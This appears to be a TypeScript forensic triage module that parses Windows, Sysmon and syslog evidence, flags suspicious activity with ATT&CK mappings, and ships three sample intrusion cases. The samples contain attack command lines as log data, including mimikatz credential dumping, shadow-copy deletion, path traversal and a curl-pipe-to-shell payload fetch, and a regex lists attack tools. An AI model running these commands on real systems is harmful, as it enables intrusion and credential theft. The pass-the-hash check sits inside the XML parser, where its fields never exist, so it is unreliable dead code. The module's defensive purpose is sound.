export type Severity = "Critical" | "High" | "Medium" | "Low";
export type ArtifactCategory =
  | "Event Log"
  | "Process"
  | "Network"
  | "File System"
  | "USB"
  | "Web"
  | "Prefetch"
  | "Shimcache"
  | "LNK"
  | "Shellbags"
  | "Browser History"
  | "Memory";

export interface ForensicEvent {
  id: string;
  timestamp: string;
  source: string;
  category: ArtifactCategory;
  title: string;
  details: string;
  severity: Severity;
  eventId?: string;
  technique?: string;
  iocs: string[];
}

export interface ProcessArtifact {
  name: string;
  pid: string;
  ppid: string;
  user: string;
  detail: string;
  suspicious: boolean;
}

export interface NetworkArtifact {
  timestamp: string;
  source: string;
  destination: string;
  protocol: string;
  detail: string;
  suspicious: boolean;
  dnsTunnel: boolean;
}

export interface EvidenceFile {
  name: string;
  size: number;
  md5: string;
  sha256: string;
  parsed: number;
}

export interface AnalysisResult {
  events: ForensicEvent[];
  processes: ProcessArtifact[];
  network: NetworkArtifact[];
  evidence: EvidenceFile[];
}

export interface SampleCase {
  id: string;
  title: string;
  summary: string;
  events: ForensicEvent[];
  processes: ProcessArtifact[];
  network: NetworkArtifact[];
}

const eventIdMap: Record<string, { title: string; category: ArtifactCategory; severity: Severity; technique: string }> = {
  "4624": { title: "Successful logon", category: "Event Log", severity: "Low", technique: "T1078" },
  "4625": { title: "Failed logon", category: "Event Log", severity: "Medium", technique: "T1110" },
  "4672": { title: "Special privileges assigned", category: "Event Log", severity: "High", technique: "T1078" },
  "4688": { title: "Process created", category: "Process", severity: "Medium", technique: "T1059" },
  "7045": { title: "New service installed", category: "Event Log", severity: "High", technique: "T1543.003" },
  "1102": { title: "Audit log cleared", category: "Event Log", severity: "Critical", technique: "T1070.001" },
  "1": { title: "Sysmon process creation", category: "Process", severity: "Medium", technique: "T1059" },
  "3": { title: "Sysmon network connection", category: "Network", severity: "Medium", technique: "T1071" },
  "11": { title: "Sysmon file created", category: "File System", severity: "Medium", technique: "T1105" },
};

const suspiciousTerms = /mimikatz|sekurlsa|procdump|rundll32|regsvr32|powershell.{0,24}-(enc|e|encodedcommand)|vssadmin.{0,24}delete|shadowcopy.{0,24}delete|certutil.{0,24}-urlcache|bitsadmin|nc\.exe|ncat|\.aspx.{0,12}shell/i;
const ipPattern = /\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b/g;
const isoDatePattern = /\b\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?\b/;

function safeDate(value: unknown): string {
  if (typeof value === "number") {
    const milliseconds = value > 10_000_000_000 ? value : value * 1000;
    const date = new Date(milliseconds);
    return Number.isNaN(date.valueOf()) ? new Date(0).toISOString() : date.toISOString();
  }
  const date = new Date(String(value ?? ""));
  return Number.isNaN(date.valueOf()) ? new Date(0).toISOString() : date.toISOString();
}

function valueFrom(record: Record<string, unknown>, names: string[]): string {
  const key = Object.keys(record).find(candidate => names.some(name => candidate.toLowerCase() === name.toLowerCase()));
  const value = key ? record[key] : "";
  return typeof value === "string" || typeof value === "number" ? String(value) : "";
}

function getEventId(record: Record<string, unknown>): string {
  return valueFrom(record, ["EventID", "EventId", "event_id", "Event ID", "id", "EventCode"]);
}

function parseCsv(text: string): Record<string, string>[] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let quoted = false;
  for (let index = 0; index < text.length; index += 1) {
    const character = text[index];
    if (character === '"' && quoted && text[index + 1] === '"') {
      cell += '"';
      index += 1;
    } else if (character === '"') {
      quoted = !quoted;
    } else if (!quoted && (character === "," || character === "\t")) {
      row.push(cell);
      cell = "";
    } else if (!quoted && (character === "\n" || character === "\r")) {
      if (character === "\r" && text[index + 1] === "\n") index += 1;
      row.push(cell);
      if (row.some(value => value.trim())) rows.push(row);
      row = [];
      cell = "";
    } else {
      cell += character;
    }
  }
  row.push(cell);
  if (row.some(value => value.trim())) rows.push(row);
  const headers = rows.shift()?.map(header => header.trim()) ?? [];
  return rows.map(values => Object.fromEntries(headers.map((header, index) => [header, values[index] ?? ""])));
}

function parseXml(text: string): Record<string, string>[] {
  const events: Record<string, string>[] = [];
  for (const match of text.matchAll(/<Event\b[\s\S]*?<\/Event>/gi)) {
    const xml = match[0];
    const record: Record<string, string> = {};
    const id = xml.match(/<EventID\b[^>]*>([\s\S]*?)<\/EventID>/i)?.[1];
    const system = xml.match(/<System\b[^>]*>([\s\S]*?)<\/System>/i)?.[1] ?? "";
    const time = system.match(/<TimeCreated\b[^>]*SystemTime="([^"]+)"/i)?.[1];
    if (id) record.EventID = id.replace(/<[^>]+>/g, "").trim();
    if (time) record.TimeCreated = time;
    for (const field of xml.matchAll(/<Data\b[^>]*Name="([^"]+)"[^>]*>([\s\S]*?)<\/Data>/gi)) {
      record[field[1]] = field[2].replace(/<[^>]+>/g, "").trim();
    }
    for (const field of ["Image", "CommandLine", "ParentImage", "TargetFilename", "DestinationIp", "DestinationPort"]) {
      if (record[field]) continue;
      const value = xml.match(new RegExp(`<${field}>([\\s\\S]*?)<\\/${field}>`, "i"))?.[1];
      if (value) record[field] = value.replace(/<[^>]+>/g, "").trim();
    }
    events.push(record);
  }
  for (const event of events.filter(item => item.eventId === "4624")) {
    const logonType = event.details.match(/(?:LogonType|Logon Type)[:= ]+(\d+)/i)?.[1];
    const authPackage = event.details.match(/(?:AuthenticationPackageName|Authentication Package)[:= ]+([^·,; ]+)/i)?.[1];
    const logonUser = event.details.match(/(?:TargetUserName|AccountName|SubjectUserName)[:= ]+([^·,; ]+)/i)?.[1];
    const privilegedFollowup = events.some(candidate => {
      if (candidate.eventId !== "4672" || Math.abs(Date.parse(candidate.timestamp) - Date.parse(event.timestamp)) > 30_000) return false;
      const privilegedUser = candidate.details.match(/(?:SubjectUserName|AccountName)[:= ]+([^·,; ]+)/i)?.[1];
      return !logonUser || !privilegedUser || logonUser.toLowerCase() === privilegedUser.toLowerCase();
    });
    if ((logonType === "9" || (logonType === "3" && /NTLM/i.test(authPackage ?? ""))) && privilegedFollowup) {
      event.title = "Possible pass-the-hash privileged logon";
      event.severity = "High";
      event.technique = "T1550.002";
    }
  }
  return events;
}

function recordsFromText(text: string, name: string): Record<string, unknown>[] {
  const trimmed = text.trim();
  if (!trimmed) return [];
  if (/\.xml$|\.evtx$/i.test(name) || trimmed.startsWith("<")) return parseXml(trimmed);
  if (/\.csv$|\.tsv$/i.test(name) || /^[^\n]+\t[^\n]+/m.test(trimmed)) return parseCsv(trimmed);
  try {
    const parsed: unknown = JSON.parse(trimmed);
    if (Array.isArray(parsed)) return parsed.filter((row): row is Record<string, unknown> => !!row && typeof row === "object");
    if (parsed && typeof parsed === "object") {
      const value = parsed as Record<string, unknown>;
      for (const key of ["events", "records", "flows", "items"]) {
        const list = value[key];
        if (Array.isArray(list)) return list.filter((row): row is Record<string, unknown> => !!row && typeof row === "object");
      }
      return [value];
    }
  } catch {
    // JSON Lines and syslog exports are handled below, one record per line.
  }
  return trimmed.split(/\r?\n/).flatMap(line => {
    try {
      const parsed: unknown = JSON.parse(line);
      return parsed && typeof parsed === "object" && !Array.isArray(parsed) ? [parsed as Record<string, unknown>] : [];
    } catch {
      const timestamp = line.match(isoDatePattern)?.[0];
      if (timestamp) {
        const eventId = line.match(/(?:EventID|Event ID|event_id)[=: ]+(\d+)/i)?.[1] ?? "";
        return [{ timestamp, eventId, message: line }];
      }
      const syslog = line.match(/^(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+(\d{1,2})\s+(\d{2}:\d{2}:\d{2})\s+(\S+)\s+([^:]+):?\s*(.*)$/i);
      if (!syslog) return [];
      const month = new Date(`${syslog[1]} 1, 2000`).getMonth();
      const [hour, minute, second] = syslog[3].split(":").map(Number);
      const syslogTimestamp = new Date(Date.UTC(new Date().getUTCFullYear(), month, Number(syslog[2]), hour, minute, second)).toISOString();
      const message = `${syslog[5]}: ${syslog[6]}`.trim();
      const eventId = /failed password|authentication failure|failed login/i.test(message) ? "4625" : "";
      const sourceIp = message.match(/\bfrom\s+((?:\d{1,3}\.){3}\d{1,3})\b/i)?.[1];
      const user = message.match(/(?:for|user[= ]+)\s*([a-z0-9._-]+)/i)?.[1];
      return [{ timestamp: syslogTimestamp, eventId, hostname: syslog[4], service: syslog[5], message, SourceIp: sourceIp ?? "", TargetUserName: user ?? "" }];
    }
  });
}

function expandMacb(records: Record<string, unknown>[], fileName: string): Record<string, unknown>[] {
  const fields: Array<[string, string]> = [
    ["Modified", "Modified"], ["Accessed", "Accessed"], ["Created", "Created"], ["Born", "Born"],
  ];
  const expanded = records.flatMap(record => {
    const timestamps = fields.flatMap(([field, label]) => {
      const aliases = field === "Modified" ? ["mtime"] : field === "Accessed" ? ["atime"] : field === "Created" ? ["ctime", "Changed", "ChangeTime"] : ["btime", "BirthTime"];
      const value = valueFrom(record, [field, `${field}Time`, `${field}Date`, `${field}_time`, ...aliases]);
      return value ? [{ value, label }] : [];
    });
    if (!timestamps.length) return [record];
    return timestamps.map(({ value, label }) => ({
      ...record,
      timestamp: value,
      _macb: label,
    }));
  });
  return expanded.map((record, index) => {
    if (!record._macb) return record;
    return { ...record, _source: fileName, _record: index };
  });
}

function parseMemoryStrings(text: string, fileName: string): Record<string, unknown>[] {
  const records: Record<string, unknown>[] = [];
  const lines = text.split(/\r?\n/);
  for (const line of lines) {
    const process = line.match(/(?:PROCESS|proc)\s+(?:pid[=: ]+)?(\d+)\s+(?:name[=: ]+)?([^\s,]+)(?:\s+(?:ppid[=: ]+)?(\d+))?/i);
    if (process) records.push({ category: "Memory", timestamp: new Date().toISOString(), ProcessId: process[1], Image: process[2], ParentProcessId: process[3] ?? "", message: line });
    const socket = line.match(/(?:SOCKET|TCP|UDP)\s+((?:\d{1,3}\.){3}\d{1,3})[: ]+(\d+)\s*->\s*((?:\d{1,3}\.){3}\d{1,3})[: ]+(\d+)/i);
    if (socket) records.push({ timestamp: new Date().toISOString(), SourceIp: socket[1], SourcePort: socket[2], DestinationIp: socket[3], DestinationPort: socket[4], Protocol: line.match(/UDP/i) ? "UDP" : "TCP", category: "Network", message: line });
    if (/(?:injected|injection|reflective loader|manual map)/i.test(line) && /\.dll\b/i.test(line)) {
      records.push({ timestamp: new Date().toISOString(), category: "Memory", Image: line.match(/[\w.-]+\.dll/i)?.[0] ?? "unknown.dll", message: `Possible hidden DLL injection indicator: ${line.trim()}` });
    }
  }
  return records.map((record, index) => ({ ...record, _memorySource: fileName, _memoryIndex: index }));
}

function categorize(record: Record<string, unknown>, eventId: string, fileName: string): ArtifactCategory {
  const combined = `${fileName} ${Object.entries(record).map(([key, value]) => `${key} ${String(value)}`).join(" ")}`.toLowerCase();
  const explicitCategory = valueFrom(record, ["category", "artifact", "artifact_type"]);
  if (/prefetch|shimcache|shellbags|browser history|lnk|memory|network|process|usb|web|file system/i.test(explicitCategory)) {
    if (/prefetch/i.test(explicitCategory)) return "Prefetch";
    if (/shimcache/i.test(explicitCategory)) return "Shimcache";
    if (/shellbags/i.test(explicitCategory)) return "Shellbags";
    if (/browser/i.test(explicitCategory)) return "Browser History";
    if (/lnk/i.test(explicitCategory)) return "LNK";
    if (/memory/i.test(explicitCategory)) return "Memory";
    if (/network/i.test(explicitCategory)) return "Network";
    if (/process/i.test(explicitCategory)) return "Process";
    if (/usb/i.test(explicitCategory)) return "USB";
    if (/web/i.test(explicitCategory)) return "Web";
    return "File System";
  }
  if (/prefetch/.test(combined)) return "Prefetch";
  if (/shimcache|appcompatcache/.test(combined)) return "Shimcache";
  if (/shellbag/.test(combined)) return "Shellbags";
  if (/browser.?history|url|domain/.test(combined) && /browser|history/.test(combined)) return "Browser History";
  if (/\.lnk\b|lnk file/.test(combined)) return "LNK";
  if (/usb|removable|volume/.test(combined)) return "USB";
  if (/network|destinationip|dest.?ip|sourceip|src.?ip|sourceaddress|destinationaddress|srcaddr|dstaddr|flow|dns/.test(combined) || eventId === "3") return "Network";
  if (/process|commandline|image|parentimage/.test(combined) || ["1", "4688"].includes(eventId)) return "Process";
  if (/memory|dump|dll|socket/.test(combined)) return "Memory";
  if (/file|targetfilename|vssadmin|shadow.?copy/.test(combined)) return "File System";
  if (/http|access.?log|web|apache|nginx/.test(combined)) return "Web";
  return "Event Log";
}

function makeEvent(record: Record<string, unknown>, fileName: string, index: number): ForensicEvent {
  const eventId = getEventId(record);
  const mapped = eventIdMap[eventId];
  const details = Object.entries(record)
    .filter(([, value]) => value !== undefined && value !== null && String(value).trim())
    .map(([key, value]) => `${key}: ${String(value)}`)
    .join(" · ")
    .slice(0, 900);
  const command = valueFrom(record, ["CommandLine", "Image", "ProcessName", "message", "Message", "description"]);
  const suspicious = suspiciousTerms.test(command);
  const failed = eventId === "4625";
  const title = mapped?.title ?? valueFrom(record, ["title", "action", "message", "Message", "description"]) ?? "Evidence record";
  return {
    id: `${fileName}-${index}`,
    timestamp: safeDate(record._macb ? record.timestamp : valueFrom(record, ["UtcTime", "TimeCreated", "timestamp", "datetime", "date", "time", "LastModified", "Modified", "Created"])),
    source: fileName,
    category: categorize(record, eventId, fileName),
    title: suspicious ? "Suspicious process execution" : title,
    details: details || "Parsed evidence record",
    severity: eventId === "1102" ? "Critical" : suspicious ? "High" : mapped?.severity ?? "Low",
    eventId: eventId || undefined,
    technique: mapped?.technique ?? (suspicious ? "T1059" : undefined),
    iocs: [...new Set([...(command.match(ipPattern) ?? []), ...(command.match(/(?:[a-z0-9-]+\.)+[a-z]{2,}/ig) ?? []).filter(domain => domain.includes(".") && !/\.(?:exe|dll|sys|bat|cmd)$/i.test(domain))])],
  };
}

export function analyzeRecords(records: Record<string, unknown>[], fileName: string): ForensicEvent[] {
  const events = expandMacb(records, fileName).map((record, index) => {
    const item = makeEvent(record, fileName, index);
    if (record._macb) item.title = `${String(record._macb)} timestamp · ${item.title}`;
    const message = valueFrom(record, ["message", "Message"]);
    if (/possible hidden dll injection indicator/i.test(message)) {
      item.title = "Possible hidden DLL injection";
      item.category = "Memory";
      item.severity = "Critical";
      item.technique = "T1055";
    }
    if (record.category === "Memory" && item.category === "Event Log") item.category = "Memory";
    const parent = valueFrom(record, ["ParentImage", "ParentProcessName"]);
    const image = valueFrom(record, ["Image", "ProcessName", "NewProcessName", "CommandLine"]);
    const officeParent = /(?:winword|excel|powerpnt|outlook|onenote)\.exe/i.test(parent);
    const scriptChild = /(?:powershell|pwsh|cmd|wscript|cscript|mshta|rundll32)\.exe/i.test(image);
    if (officeParent && scriptChild) {
      item.title = "Anomalous process execution";
      item.severity = "High";
      item.technique = "T1059";
    }
    return item;
  });
  const failedLogons = events.filter(event => event.eventId === "4625");
  for (const event of failedLogons) {
    const address = event.details.match(/(?:IpAddress|SourceIp|src_ip|Source Network Address)[:= ]+([0-9.]+)/i)?.[1];
    const similar = failedLogons.filter(candidate => {
      const candidateAddress = candidate.details.match(/(?:IpAddress|SourceIp|src_ip|Source Network Address)[:= ]+([0-9.]+)/i)?.[1];
      return address && candidateAddress === address && Math.abs(Date.parse(candidate.timestamp) - Date.parse(event.timestamp)) <= 5 * 60_000;
    });
    if (similar.length >= 5) {
      event.title = "Brute-force login activity";
      event.severity = "High";
      event.technique = "T1110";
      if (address) event.iocs = [...new Set([...event.iocs, address])];
    }
  }
  return events;
}

export function extractProcesses(events: ForensicEvent[]): ProcessArtifact[] {
  const seen = new Set<string>();
  const result: ProcessArtifact[] = [];
  for (const event of events) {
    if (event.category !== "Process" && event.category !== "Memory") continue;
    const read = (keys: string[]) => {
      for (const key of keys) {
        const value = event.details.match(new RegExp(`${key}[:= ]+([^·,;]+)`, "i"))?.[1]?.trim();
        if (value) return value;
      }
      return "";
    };
    const image = read(["Image", "ProcessName", "NewProcessName", "CommandLine"]);
    if (!image) continue;
    const name = image.split(/[\\/]/).pop()?.split(" ")[0] ?? image;
    const pid = read(["ProcessId", "ProcessID", "NewProcessId"]) || `file-${result.length + 1}`;
    if (seen.has(pid)) continue;
    seen.add(pid);
    result.push({
      name,
      pid,
      ppid: read(["ParentProcessId", "ParentProcessID"]) || "—",
      user: read(["User", "SubjectUserName", "AccountName"]) || "unknown",
      detail: read(["CommandLine"]) || image,
      suspicious: event.severity === "High" || suspiciousTerms.test(image),
    });
  }
  return result;
}

export function extractNetwork(events: ForensicEvent[]): NetworkArtifact[] {
  return events.filter(event => event.category === "Network").map(event => {
    const destination = event.iocs.find(value => /^(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)$/.test(value)) ?? event.details.match(/(?:DestinationIp|dest_ip|Destination|QueryName|domain)[:= ]+([^·,; ]+)/i)?.[1] ?? "unknown";
    const dnsTunnel = /dns|queryname/i.test(event.details) && (destination.length > 45 || /[a-z0-9]{30,}\./i.test(destination));
    const destinationPort = event.details.match(/(?:DestinationPort|dest_port|dport)[:= ]+(\d+)/i)?.[1];
    const suspiciousDestination = /(?:c2|command.and.control|malicious|known.bad|threat.indicator)/i.test(event.details)
      || (!!destinationPort && ["1337", "4444", "5555", "6667", "31337"].includes(destinationPort));
    return {
      timestamp: event.timestamp,
      source: event.details.match(/(?:SourceIp|src_ip|Source)[:= ]+([^·,; ]+)/i)?.[1] ?? "host",
      destination,
      protocol: event.details.match(/(?:Protocol|proto)[:= ]+([^·,; ]+)/i)?.[1] ?? (dnsTunnel ? "DNS" : "unknown"),
      detail: dnsTunnel ? "Long/high-entropy DNS query; possible tunneling" : event.details,
      suspicious: event.severity === "High" || event.severity === "Critical" || suspiciousDestination,
      dnsTunnel,
    };
  });
}

export function parseEvidenceText(text: string, fileName: string): Record<string, unknown>[] {
  const decoded = recordsFromText(text, fileName);
  return /\.dmp$|\.mem$|memory|dump/i.test(fileName)
    ? [...decoded, ...parseMemoryStrings(text, fileName)]
    : decoded;
}

function event(
  id: string, when: string, source: string, category: ArtifactCategory, title: string,
  details: string, severity: Severity, technique?: string, iocs: string[] = [], eventId?: string,
): ForensicEvent {
  return { id, timestamp: new Date(when).toISOString(), source, category, title, details, severity, technique, iocs, eventId };
}

export const sampleCases: SampleCase[] = [
  {
    id: "case-01",
    title: "Case 01 · Ransomware Execution & Lateral Movement",
    summary: "Encoded PowerShell, credential dumping, SMB spread, and staged encryption activity.",
    events: [
      event("r-1", "2026-09-18T08:14:02Z", "Security.evtx", "Event Log", "Successful logon", "AccountName: j.smith · IpAddress: 10.20.4.18 · LogonType: 10", "Low", "T1078", ["10.20.4.18"]),
      event("r-2", "2026-09-18T08:21:19Z", "Sysmon.json", "Process", "Suspicious process execution", "Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe · CommandLine: powershell.exe -enc SQBFAFgA... · ParentImage: WINWORD.EXE · ProcessId: 4480 · ParentProcessId: 3120 · User: j.smith", "High", "T1059.001", [], "1"),
      event("r-3", "2026-09-18T08:22:06Z", "Sysmon.json", "Process", "Credential dumping utility launched", "Image: C:\\Users\\Public\\mimikatz.exe · CommandLine: mimikatz.exe sekurlsa::logonpasswords · ProcessId: 4528 · ParentProcessId: 4480 · User: j.smith", "Critical", "T1003.001", ["mimikatz.exe"], "1"),
      event("r-4", "2026-09-18T08:24:40Z", "Sysmon.json", "Network", "SMB lateral movement connection", "SourceIp: 10.20.4.18 · DestinationIp: 10.20.4.22 · DestinationPort: 445 · Protocol: TCP", "High", "T1021.002", ["10.20.4.18", "10.20.4.22"], "3"),
      event("r-5", "2026-09-18T08:25:02Z", "Security.evtx", "Process", "Process created", "EventID: 4688 · NewProcessName: \\\\10.20.4.22\\ADMIN$\\update.exe · SubjectUserName: j.smith", "High", "T1021.002", ["10.20.4.22"], "4688"),
      event("r-6", "2026-09-18T08:29:13Z", "Sysmon.json", "File System", "Ransom note dropped", "TargetFilename: C:\\Users\\Public\\RECOVER_FILES.txt · Image: C:\\Users\\Public\\update.exe", "Critical", "T1486", ["RECOVER_FILES.txt"], "11"),
    ],
    processes: [
      { name: "WINWORD.EXE", pid: "3120", ppid: "1080", user: "j.smith", detail: "Opened invoice_0926.docm", suspicious: false },
      { name: "powershell.exe", pid: "4480", ppid: "3120", user: "j.smith", detail: "Encoded command; spawned from WINWORD.EXE", suspicious: true },
      { name: "mimikatz.exe", pid: "4528", ppid: "4480", user: "j.smith", detail: "sekurlsa::logonpasswords", suspicious: true },
      { name: "update.exe", pid: "6012", ppid: "4", user: "SYSTEM", detail: "Remote SMB service execution", suspicious: true },
    ],
    network: [
      { timestamp: "2026-09-18T08:24:40Z", source: "10.20.4.18", destination: "10.20.4.22", protocol: "TCP/445", detail: "SMB lateral movement", suspicious: true, dnsTunnel: false },
      { timestamp: "2026-09-18T08:26:00Z", source: "10.20.4.22", destination: "198.51.100.77", protocol: "TCP/443", detail: "Periodic outbound TLS beacon", suspicious: true, dnsTunnel: false },
    ],
  },
  {
    id: "case-02",
    title: "Case 02 · Insider Threat Data Exfiltration",
    summary: "Removable media use, mass staging, shadow copy deletion, and suspicious outbound transfer.",
    events: [
      event("i-1", "2026-09-21T13:02:11Z", "System.evtx", "USB", "Removable volume attached", "Device: USBSTOR\\Disk&Ven_SanDisk · Volume: E: · User: a.lee · Serial: 4C530001230918", "Medium", "T1091", ["4C530001230918"]),
      event("i-2", "2026-09-21T13:17:52Z", "Sysmon.json", "Process", "Suspicious process execution", "Image: C:\\Windows\\System32\\vssadmin.exe · CommandLine: vssadmin.exe delete shadows /all /quiet · User: a.lee", "High", "T1490"),
      event("i-3", "2026-09-21T13:25:04Z", "USNJournal.csv", "File System", "Bulk file staging", "Path: C:\\Users\\a.lee\\AppData\\Local\\Temp\\archive\\ · Files staged: 2,418 · Total: 8.6 GB · Modified: 2026-09-21T13:25:04Z", "High", "T1074.001"),
      event("i-4", "2026-09-21T13:31:10Z", "Sysmon.json", "Process", "Archive utility launched", "Image: C:\\Program Files\\7-Zip\\7z.exe · CommandLine: 7z.exe a -mx=9 E:\\finance_q3.7z C:\\Users\\a.lee\\AppData\\Local\\Temp\\archive\\ · User: a.lee", "High", "T1560.001", ["finance_q3.7z"]),
      event("i-5", "2026-09-21T13:48:22Z", "Sysmon.json", "Network", "Large outbound transfer", "SourceIp: 10.30.2.19 · DestinationIp: 203.0.113.41 · DestinationPort: 443 · BytesOut: 8742210048 · Protocol: HTTPS", "Critical", "T1567.002", ["203.0.113.41"]),
      event("i-6", "2026-09-21T14:03:46Z", "System.evtx", "USB", "Removable volume safely removed", "Volume: E: · User: a.lee · Serial: 4C530001230918", "Low", "T1091", ["4C530001230918"]),
    ],
    processes: [
      { name: "explorer.exe", pid: "2310", ppid: "1120", user: "a.lee", detail: "Interactive desktop session", suspicious: false },
      { name: "vssadmin.exe", pid: "6048", ppid: "2310", user: "a.lee", detail: "delete shadows /all /quiet", suspicious: true },
      { name: "7z.exe", pid: "6812", ppid: "2310", user: "a.lee", detail: "High-compression archive to removable E:", suspicious: true },
    ],
    network: [
      { timestamp: "2026-09-21T13:48:22Z", source: "10.30.2.19", destination: "203.0.113.41", protocol: "HTTPS/443", detail: "8.1 GiB outbound upload", suspicious: true, dnsTunnel: false },
    ],
  },
  {
    id: "case-03",
    title: "Case 03 · Web Shell Deployment & Persistence",
    summary: "Exploit requests followed by web-shell execution and a new persistence service.",
    events: [
      event("w-1", "2026-09-24T02:11:06Z", "access.log", "Web", "Suspicious web request", "Client: 198.51.100.23 · GET /download?file=../../etc/passwd · Status: 200 · User-Agent: curl/8.1", "High", "T1190", ["198.51.100.23"]),
      event("w-2", "2026-09-24T02:13:48Z", "access.log", "Web", "Web shell uploaded", "Client: 198.51.100.23 · POST /uploads/cache.aspx · Status: 200 · Bytes: 1842", "Critical", "T1505.003", ["198.51.100.23", "cache.aspx"]),
      event("w-3", "2026-09-24T02:15:01Z", "Sysmon.json", "Process", "Web worker spawned shell", "Image: /bin/sh · CommandLine: /bin/sh -c id; curl http://198.51.100.23/p.sh | sh · ParentImage: /usr/sbin/apache2 · User: www-data", "Critical", "T1059.004", ["198.51.100.23"]),
      event("w-4", "2026-09-24T02:18:30Z", "auth.log", "Event Log", "New service installed", "ServiceName: system-update · ImagePath: /usr/local/bin/.cache-sync · User: root · EventID: 7045", "Critical", "T1543.002"),
      event("w-5", "2026-09-24T02:19:13Z", "syslog", "File System", "Cron persistence created", "Path: /etc/cron.d/system-update · Command: /usr/local/bin/.cache-sync · User: root", "High", "T1053.003"),
      event("w-6", "2026-09-24T02:22:07Z", "syslog", "Network", "Repeated outbound callback", "SourceIp: 10.40.1.8 · DestinationIp: 198.51.100.23 · DestinationPort: 443 · Protocol: TCP", "High", "T1071.001", ["10.40.1.8", "198.51.100.23"]),
    ],
    processes: [
      { name: "apache2", pid: "874", ppid: "1", user: "www-data", detail: "Public-facing web worker", suspicious: false },
      { name: "sh", pid: "1248", ppid: "874", user: "www-data", detail: "Shell spawned by apache2; remote payload fetch", suspicious: true },
      { name: ".cache-sync", pid: "1302", ppid: "1", user: "root", detail: "Unrecognized persistence service", suspicious: true },
    ],
    network: [
      { timestamp: "2026-09-24T02:22:07Z", source: "10.40.1.8", destination: "198.51.100.23", protocol: "TCP/443", detail: "Outbound callback to initial access host", suspicious: true, dnsTunnel: false },
    ],
  },
];

export function createReport(result: AnalysisResult, caseTitle: string, format: "json" | "markdown"): string {
  const events = [...result.events].sort((a, b) => a.timestamp.localeCompare(b.timestamp));
  const report = {
    reportTitle: "0x8Acure Forensic Case Report",
    generatedAt: new Date().toISOString(),
    caseTitle,
    evidence: result.evidence,
    summary: {
      eventCount: events.length,
      criticalFindings: events.filter(item => item.severity === "Critical").length,
      highFindings: events.filter(item => item.severity === "High").length,
    },
    indicatorsOfCompromise: [...new Set(events.flatMap(item => item.iocs))],
    mitreAttack: [...new Set(events.flatMap(item => item.technique ? [item.technique] : []))],
    chronologicalTimeline: events,
    processes: result.processes,
    network: result.network,
    handlingNote: "Client-side triage output. Validate findings against original evidence and document examiner, acquisition method, and custody transfers.",
  };
  if (format === "json") return JSON.stringify(report, null, 2);
  return [
    `# ${report.reportTitle}`,
    `\n- **Case:** ${caseTitle}`,
    `- **Generated:** ${report.generatedAt}`,
    `- **Events:** ${report.summary.eventCount} · **Critical:** ${report.summary.criticalFindings} · **High:** ${report.summary.highFindings}`,
    `\n## Evidence`,
    ...(result.evidence.length ? result.evidence.map(file => `- \`${file.name}\` — ${file.size} bytes · MD5 \`${file.md5}\` · SHA-256 \`${file.sha256}\``) : ["- Sample-case evidence; no uploaded originals."]),
    `\n## Indicators of Compromise`,
    ...(report.indicatorsOfCompromise.length ? report.indicatorsOfCompromise.map(value => `- \`${value}\``) : ["- None extracted."]),
    `\n## MITRE ATT&CK`,
    ...(report.mitreAttack.length ? report.mitreAttack.map(value => `- ${value}`) : ["- No mappings available."]),
    `\n## Chronological Timeline`,
    ...events.map(item => `- **${item.timestamp}** [${item.severity}] ${item.title} — ${item.details}${item.technique ? ` · ${item.technique}` : ""}`),
    `\n## Examiner Note\n${report.handlingNote}`,
  ].join("\n");
}

export function md5(bytes: Uint8Array): string {
  const bitLength = bytes.length * 8;
  const paddedLength = Math.ceil((bytes.length + 9) / 64) * 64;
  const buffer = new Uint8Array(paddedLength);
  buffer.set(bytes);
  buffer[bytes.length] = 0x80;
  const view = new DataView(buffer.buffer);
  view.setUint32(paddedLength - 8, bitLength >>> 0, true);
  view.setUint32(paddedLength - 4, Math.floor(bitLength / 0x1_0000_0000), true);
  const shifts = [7, 12, 17, 22, 5, 9, 14, 20, 4, 11, 16, 23, 6, 10, 15, 21];
  const constants = Array.from({ length: 64 }, (_, index) => Math.floor(Math.abs(Math.sin(index + 1)) * 0x1_0000_0000) >>> 0);
  let a0 = 0x67452301, b0 = 0xefcdab89, c0 = 0x98badcfe, d0 = 0x10325476;
  for (let offset = 0; offset < paddedLength; offset += 64) {
    const words = Array.from({ length: 16 }, (_, index) => view.getUint32(offset + index * 4, true));
    let a = a0, b = b0, c = c0, d = d0;
    for (let index = 0; index < 64; index += 1) {
      let fn: number, wordIndex: number;
      if (index < 16) { fn = (b & c) | (~b & d); wordIndex = index; }
      else if (index < 32) { fn = (d & b) | (~d & c); wordIndex = (5 * index + 1) % 16; }
      else if (index < 48) { fn = b ^ c ^ d; wordIndex = (3 * index + 5) % 16; }
      else { fn = c ^ (b | ~d); wordIndex = (7 * index) % 16; }
      const shift = shifts[Math.floor(index / 16) * 4 + (index % 4)];
      const sum = (a + fn + constants[index] + words[wordIndex]) >>> 0;
      const rotated = (sum << shift) | (sum >>> (32 - shift));
      [a, b, c, d] = [d, (b + rotated) >>> 0, b, c];
    }
    a0 = (a0 + a) >>> 0; b0 = (b0 + b) >>> 0; c0 = (c0 + c) >>> 0; d0 = (d0 + d) >>> 0;
  }
  return [a0, b0, c0, d0].map(word => Array.from({ length: 4 }, (_, index) => (word >>> (index * 8)) & 0xff).map(byte => byte.toString(16).padStart(2, "0")).join("")).join("");
}
